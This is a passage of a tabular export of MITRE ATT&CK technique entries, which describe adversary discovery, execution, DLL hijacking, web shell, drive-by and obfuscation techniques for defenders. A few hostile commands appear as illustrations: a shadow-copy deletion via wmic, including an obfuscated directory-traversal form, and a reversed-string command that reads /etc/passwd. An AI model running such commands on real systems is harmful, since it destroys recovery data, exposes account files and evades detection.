Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:27Z
attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055,42,T1047,Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.

The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)

**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",Windows,FALSE,FALSE,2017-05-31T21:30:44Z
attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580,41,T1057,Process Discovery,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)

On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:48Z
attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63,41,T1203,Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.","Linux, macOS, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104,40,T1033,System Owner/User Discovery,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.

On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:35Z
attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144,40,T1027.013,Encrypted/Encoded File,"Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.

This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.

The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.

For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) 

Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.","Linux, macOS, Windows",FALSE,FALSE,2024-03-29T12:38:17Z
attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735,40,T1018,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.

Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.

Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  
","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:28Z
attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662,39,T1560.001,Archive via Utility,"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.

Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. 

On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. 

Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)","Linux, macOS, Windows",FALSE,FALSE,2020-02-20T21:01:25Z
attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c,38,T1140,Deobfuscate/Decode Files or Information,"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)

Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-12-14T16:46:06Z
attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf,37,T1021.001,Remote Desktop Protocol,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) 

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",Windows,FALSE,FALSE,2020-02-11T18:23:26Z
attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34,35,T1574.001,DLL,"Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

Specific ways DLLs are abused by adversaries include:

### DLL Sideloading
Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

Adversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. (Citation: Virus Bulletin) Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. (Citation: Sophos)

### DLL Search Order Hijacking
Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

### DLL Redirection
Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

### Phantom DLL Hijacking
Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

### DLL Substitution
Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",Windows,FALSE,FALSE,2020-03-13T18:11:08Z
attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475,32,T1049,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. 

An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.

Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), ""net use,"" and ""net session"" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to ""net session"". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)","ESXi, IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:45Z
attack-pattern--bbde9781-60aa-4b8a-a911-895b0c1b3872,32,T1685,Disable or Modify Tools,"Adversaries may disable, degrade, or tamper with security tools or applications (e.g., endpoint detection and response (EDR) tools, intrusion detection systems (IDS), antivirus, logging agents, sensors, etc.) to impair or reduce visibility of defensive capabilities. This may include stopping specific services, killing processes, modifying or deleting tool configuration files and Registry keys, or preventing tools from updating. This may also include impairing defenses more broadly by disrupting preventative, detection, and response mechanisms across host, network, and cloud environments.(Citation: SCADAfence_ransomware) 

In addition to directly targeting tools, adversaries may block or manipulate indicators and telemetry used for detection. This includes maliciously disabling or redirecting sensors such as Event Tracing for Windows (ETW), modifying event log configurations (e.g., redirecting Security logs), or interfering with logging pipelines and forwarding mechanisms (e.g., SIEM ingestion).(Citation: Microsoft Lamin Sept 2017)(Citation: ETW Palantir)

More advanced techniques include leveraging legitimate drivers or debugging mechanisms to render tools non-functional, bypassing anti-tampering protections, and targeting specific defenses such as Sysmon or cloud monitoring agents. Adversaries may also disrupt broader defensive operations, including update mechanisms, logging infrastructure (e.g., syslog), or event aggregation, further degrading an organization’s ability to detect and respond to malicious activity.(Citation: Cocomazzi FIN7 Reboot)","Containers, ESXi, IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2026-04-14T22:53:26Z
attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb,31,T1505.003,Web Shell,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2019-12-13T16:46:18Z
attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6,31,T1189,Drive-by Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:

* A legitimate website is compromised, allowing adversaries to inject malicious code
* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary
* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))
* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)

Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking ""allow"" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.","Identity Provider, Linux, macOS, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88,31,T1046,Network Service Discovery,"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.

Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)","Containers, IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:43Z
attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af,29,T1087.002,Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.

Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)","Linux, macOS, Windows",FALSE,FALSE,2020-02-21T21:08:26Z
attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4,29,T1112,Modify Registry,"Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.

The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to impair defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",Windows,FALSE,FALSE,2017-05-31T21:31:23Z
attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377,29,T1027.010,Command Obfuscation,"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)

For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)

Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)

Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)","Linux, macOS, Windows",FALSE,FALSE,2023-03-14T17:36:01Z
attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d,28,T1133,External Remote Services,"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)

Adversaries may also establish persistence on network by configuring a Tor hidden service on a compromised system. Adversaries may utilize the tool `ShadowLink` to facilitate the installation and configuration of the Tor hidden service. Tor hidden service is then accessible via the Tor network because `ShadowLink` sets up a .onion address on the compromised system. `ShadowLink` may be used to forward any inbound connections to RDP, allowing the adversaries to have remote access.(Citation: The BadPilot campaign) Adversaries may get `ShadowLink` to persist on a system by masquerading it as an MS Defender application.(Citation: Russian threat actors dig in, prepare to seize on war fatigue)","Containers, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:44Z
attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c,28,T1074.001,Local Data Staging,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-13T21:13:10Z
attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082,27,T1553.002,Code Signing,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.

Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.","macOS, Windows",FALSE,FALSE,2020-02-05T16:27:37Z
attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e,27,T1608.001,Upload Malware,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin; hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult; or saved on the blockchain as smart contracts, which are resilient against takedowns that would affect traditional infrastructure.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)(Citation: Guardio Etherhiding 2023)(Citation: Bleeping Computer Binance Smart Chain 2023)

Adversaries may upload backdoored files, such as software packages, application binaries, virtual machine images, or container images, to third-party software stores, package libraries, extension marketplaces, or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub, PyPi, NPM).(Citation: Datadog Security Labs Malicious PyPi Packages 2024) By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). Masquerading, including typosquatting legitimate software, may increase the chance of users mistakenly executing these files.",PRE,FALSE,FALSE,2021-03-17T20:09:13Z
attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541,27,T1021.002,SMB/Windows Admin Shares,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

